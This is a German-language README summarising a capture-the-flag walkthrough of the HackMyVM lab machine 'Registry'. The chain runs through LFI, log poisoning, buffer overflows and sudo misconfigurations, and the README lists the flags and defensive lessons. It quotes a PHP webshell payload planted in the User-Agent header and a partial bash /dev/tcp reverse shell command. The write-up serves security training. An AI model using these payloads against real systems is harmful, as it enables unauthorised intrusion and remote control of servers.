# Registry - HackMyVM

**Schwierigkeitsgrad:** Hard 🔴

---

## ℹ️ Maschineninformationen

*   **Plattform:** HackMyVM
*   **VM Link:** [https://hackmyvm.eu/machines/machine.php?vm=Registry](https://hackmyvm.eu/machines/machine.php?vm=Registry)
*   **Autor:** DarkSpirit

![Registry Machine Icon](Registry.png)

---

## 🏁 Übersicht

Dieser Bericht dokumentiert den Penetrationstest der virtuellen Maschine "Registry" von HackMyVM. Das Ziel war die Erlangung von Systemzugriff und die Ausweitung der Berechtigungen bis auf Root-Ebene. Die Maschine wies kritische Schwachstellen auf, darunter Local File Inclusion (LFI), die zu Log-Poisoning und initialer Remote Code Execution (RCE) führte, sowie mehrere Stufen der Privilege Escalation durch die Ausnutzung von Buffer Overflows in SUID-Binärdateien in Kombination mit unsicheren Sudo-Berechtigungen und Gruppen-Schreibrechten.

---

## 📖 Zusammenfassung des Walkthroughs

Der Pentest gliederte sich in folgende Hauptphasen:

### 🔎 Reconnaissance

*   Netzwerkscan (`arp-scan`) zur Identifizierung der Ziel-IP (192.168.2.51).
*   Hinzufügen des Hostnamens `registry.hmv` zur lokalen `/etc/hosts`.
*   Umfassender Portscan (`nmap`), der Port 22 (SSH - OpenSSH 8.9p1) und Port 80 (HTTP - Apache httpd 2.4.52) als offen identifizierte.

### 🌐 Web Enumeration

*   Scan des Webservers auf Port 80 mit `nikto`, der veraltete Software, Informationslecks (interne IP 127.0.1.1) und Verzeichnislistungen (`/css/`, `/images/`) aufdeckte.
*   Verzeichnis-Brute-Force mit `gobuster` identifizierte u.a. `index.php` und `default.php`.
*   Entdeckung einer Local File Inclusion (LFI) Schwachstelle im `page`-Parameter von `index.php`, ausnutzbar mit `file://` Wrapper und Verzeichnis-Traversal (`....//`). Erfolgreiches Lesen von `/etc/passwd` als Beweis.
*   Suche nach weiteren inkludierbaren Dateien mit `wfuzz` identifizierte u.a. `/var/log/apache2/access.log` und `/var/log/apache2/error.log`. Analyse der Apache-Konfiguration ergab, dass der Access Log für Log Poisoning geeignet ist (Log Level "warn" für Error Log).

### 💻 Initialer Zugriff

*   Einschleusen eines PHP-Payloads (`<?php system($GET['cmd']); ?>`) in den User-Agent-Header einer Anfrage.
*   Ausnutzung der LFI-Schwachstelle zur Inklusion des `access.log` (`index.php?page=file:///.../access.log`) und Ausführung des eingeschleusten PHP-Codes über den `cmd`-Parameter (`&cmd=id`). Nachweis der RCE als `www-data`.
*   Initiierung einer Reverse Shell (`/bin/bash -c 'bash -i >& /dev/tcp/...`') über die RCE.
*   Erfolgreiche Erlangung einer initialen Shell als Benutzer `www-data`.

### 📈 Privilege Escalation

*   Von der `www-data` Shell: Prüfung der `sudo`-Berechtigungen (`sudo -l`). Gefunden: `(gato : gato) NOPASSWD: /usr/bin/wine /opt/projects/MyFirstProgram.exe`.
*   Identifizierung einer SUID-Binärdatei `/opt/others/program` owned by `cxdxnt` (`find / -perm /4000`, `ls -la`). Analyse zeigte Buffer Overflow Schwachstelle.
*   Ausnutzung des Buffer Overflows in `/opt/others/program` (SUID `cxdxnt`) zur Erlangung einer Shell als Benutzer `cxdxnt`.
*   Von der `cxdxnt` Shell: Prüfung der `sudo`-Berechtigungen (`sudo -l`) bestätigte den `(gato : gato) NOPASSWD` Eintrag. Gefunden der User Flag in `/home/cxdxnt/user.txt`.
*   Analyse der Binärdatei `/opt/fixed/new` (Kopie von `/opt/others/program`) zeigte weiterhin Buffer Overflow Anfälligkeit (No Canary, NX enabled). Gefunden, dass `/opt/fixed` owned by `root:admins` ist und Schreibberechtigungen für `admins` hat. Gefunden, dass `gato` Mitglied der Gruppe `admins` ist (`id`).
*   Starten der anfälligen Binärdatei unter Wine als `gato` (`sudo -u gato wine /opt/projects/MyFirstProgram.exe &`) öffnete Netzwerkdienst auf Port 42424.
*   Ausnutzung des Buffer Overflows über den Netzwerkdienst auf Port 42424 (mithilfe eines Python-Skripts und Windows/x86 Reverse Shell Shellcode) zur Erlangung einer Shell als Benutzer `gato` (Wine/Windows Shell).
*   Von der `gato` Shell (oder einem neuen Gato Linux Kontext): Ausnutzung des Buffer Overflows in `/opt/fixed/new` (da schreibbar durch `admins` Gruppe) zur Erlangung einer Root-Shell.
*   Erfolgreiche Erlangung einer Root-Shell.

### 🚩 Flags

*   **User Flag:** Gefunden in `/home/cxdxnt/user.txt`
    ` REGISTRY{4R3_Y0U_R34D1N6_MY_F1L35?} `
*   **Root Flag:** Gefunden in `/root/root.txt`
    ` REGISTRY{7H3_BUFF3R_0V3RF10W_15_FUNNY} `

---

## 🧠 Wichtige Erkenntnisse

*   **Local File Inclusion (LFI):** Eine grundlegende, aber kritische Schwachstelle, die das Lesen beliebiger Dateien ermöglicht und oft zu weiterer Kompromittierung (z.B. Log Poisoning) führt. Strikte Input-Validierung ist unerlässlich.
*   **Log Poisoning:** Die Kombination von LFI mit beschreibbaren und inkludierbaren Log-Dateien ermöglicht RCE. Die Überwachung und Einschränkung des Zugriffs auf Log-Dateien sowie die Implementierung von WAFs sind wichtig.
*   **SUID-Binärdateien:** SUID-Programme, insbesondere solche mit Sicherheitslücken (Buffer Overflows), sind direkte Vektoren zur Privilege Escalation. Periodische Überprüfung und Entfernung von SUID-Berechtigungen auf unnötigen Binärdateien sind entscheidend.
*   **Buffer Overflows:** Fehlen von Schutzmechanismen wie Stack Canary und NX (No-Execute) machen Programme anfällig für die Ausführung von Shellcode. Sorgfältige Binäranalyse und Exploitation sind notwendig.
*   **Sudo Misconfigurations:** `NOPASSWD`-Einträge ermöglichen passwortlose Ausführung von Befehlen als anderer Benutzer. Kombiniert mit einem anfälligen Programm führt dies direkt zu höherer Berechtigung.
*   **Gruppen-Schreibrechte:** Schreibberechtigungen für administrative Gruppen in Systemverzeichnissen ermöglichen das Platzieren von bösartigem Code, der von privilegierten Prozessen ausgeführt wird.
*   **Wine in PE-Ketten:** Die Ausführung von Windows-Programmen unter Wine als privilegierter Benutzer kann neue Angriffsflächen eröffnen, insbesondere wenn die Wine-Umgebung selbst oder die ausgeführten Programme Schwachstellen aufweisen und Netzwerkdienste nutzen.

---

## 📄 Vollständiger Bericht

Eine detaillierte Schritt-für-Schritt-Anleitung, inklusive Befehlsausgaben, Analyse, Bewertung und Empfehlungen für jeden Schritt, finden Sie im vollständigen HTML-Bericht:

[**➡️ Vollständigen Pentest-Bericht hier ansehen**](https://alientec1908.github.io/Registry_HackMyVM_Hard/)

---

*Berichtsdatum: 17. Juni 2025*
*Pentest durchgeführt von Ben Chehade*
